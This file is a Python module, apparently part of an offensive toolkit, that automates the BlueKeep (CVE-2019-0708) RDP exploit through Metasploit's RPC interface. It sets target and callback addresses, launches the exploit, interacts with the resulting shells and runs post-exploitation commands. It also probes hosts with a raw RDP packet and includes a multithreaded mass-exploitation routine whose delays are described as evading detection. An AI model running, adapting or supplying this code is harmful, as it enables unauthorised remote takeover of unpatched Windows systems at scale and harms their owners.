# File: modules/exploit_lib/cve_2019_0708_bluekeep.py

"""
BlueKeep RDP RCE exploit using Metasploit’s `cve_2019_0708_bluekeep_rce` module
via msfrpc. (Fixed missing import, improved error handling, dynamic payload selector.)
"""

import logging
import subprocess
import time                # <-- added
from bismillah import log_event
from metasploit.msfrpc import MsfRpcClient

logger = logging.getLogger("cve_2019_0708_bluekeep")

def exploit(target: str, port: int = 3389, use_payload: str = None, lhost: str = "192.168.1.10", lport: int = 4444, auto_shell: bool = False, post_cmd: str = None, shell_timeout: int = 10) -> dict:
    """
    Enhanced BlueKeep exploit:
    - Supports custom LHOST/LPORT, auto_shell interaction, post-exploitation command, and session output collection.
    - Returns detailed results for each session.
    """
    try:
        msf_host = "127.0.0.1"
        msf_port = 55553
        user = "msf"
        pwd = "abc123"
        module_name = "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"

        logger.info(f"[+] Connecting to msfrpcd at {msf_host}:{msf_port}")
        client = MsfRpcClient(pwd, server=msf_host, port=msf_port, username=user)
        logger.info("[+] Authenticated to msfrpcd")

        mod = client.modules.use("exploit", module_name)
        mod["RHOSTS"] = target
        mod["RPORT"] = port

        if use_payload:
            mod["PAYLOAD"] = use_payload
            mod["LHOST"] = lhost
            mod["LPORT"] = lport

        logger.info(f"[+] Launching BlueKeep exploit (payload={'none' if not use_payload else use_payload})")
        job_id = mod.execute()
        logger.info(f"[+] Module job queued as ID {job_id}, waiting 15s for sessions")
        time.sleep(15)

        sessions = client.sessions.list
        session_results = {}
        if sessions:
            logger.info(f"[+] Sessions: {sessions}")
            for sid in sessions:
                try:
                    logger.info(f"[+] Interacting with session {sid}")
                    shell = client.sessions.session(sid)
                    output = ""
                    if auto_shell:
                        shell.write("sysinfo\n")
                        time.sleep(2)
                        output += shell.read()
                    if post_cmd:
                        shell.write(post_cmd + "\n")
                        time.sleep(shell_timeout)
                        output += shell.read()
                    session_results[sid] = output
                except Exception as ex:
                    logger.warning(f"[!] Failed to interact with session {sid}: {ex}")
            log_event("cve_2019_0708_bluekeep", f"Exploit success: {target}:{port} sessions={sessions}".encode())
            return {"status": "ok", "sessions": sessions, "outputs": session_results}
        else:
            log_event("cve_2019_0708_bluekeep", f"Exploit failed: {target}:{port} no session".encode())
            return {"status": "error", "detail": "No sessions – target might not be vulnerable or network blocked."}
    except Exception as e:
        logger.error(f"[-] BlueKeep exploit failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        log_event("cve_2019_0708_bluekeep", f"Exploit error: {target}:{port} {e}".encode())
        return {"status": "error", "detail": str(e)}

def can_run_on(target: str, port: int = 3389, check_banner: bool = False) -> bool:
    """
    Enhanced: 
    - Checks if the target RDP port is open.
    - Optionally grabs the RDP banner to fingerprint OS/version.
    Returns True if likely vulnerable, False otherwise.
    """
    import socket
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target, port))
        if check_banner:
            try:
                # Send RDP negotiation request (minimal)
                s.sendall(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00\x00")
                banner = s.recv(64)
                # Dangerous: log banner for fingerprinting
                logger.info(f"[+] RDP banner from {target}:{port}: {banner.hex()}")
                # Heuristic: check for "Cookie: mstshash" or "RDP" in banner
                if b"RDP" in banner or b"Cookie" in banner:
                    return True
            except Exception as be:
                logger.warning(f"[!] Banner grab failed: {be}")
        s.close()
        return True
    except Exception as e:
        logger.debug(f"can_run_on: {target}:{port} not open ({e})")
        return False

def mass_exploit(targets, threads_per_target: int = 1, delay: float = 0.0, **kwargs):
    """
    Dangerous: Mass exploit multiple targets in parallel.
    targets: list of IPs or (IP, port) tuples.
    threads_per_target: number of parallel attempts per target/port.
    delay: delay (seconds) between thread launches.
    kwargs: passed to exploit().
    Returns dict of results.
    Enhanced:
      - Multi-threaded per target/port (for reliability/bypass)
      - Optional delay between launches (evade detection)
      - Collects all results (including errors)
      - Logs all actions and errors robustly
    """
    import threading
    import time as _time
    results = {}
    lock = threading.Lock()
    def worker(tgt, port, idx):
        try:
            res = exploit(tgt, port=port, **kwargs)
            with lock:
                results[(tgt, port, idx)] = res
        except Exception as e:
            logger.error(f"mass_exploit error for {tgt}:{port} (thread {idx}): {e}")
    threads = []
    for item in targets:
        if isinstance(item, tuple):
            tgt, port = item
        else:
            tgt, port = item, 3389
        for i in range(threads_per_target):
            t = threading.Thread(target=worker, args=(tgt, port, i), daemon=True)
            threads.append(t)
            t.start()
            if delay > 0:
                _time.sleep(delay)
    for t in threads:
        t.join(timeout=90)
    return results
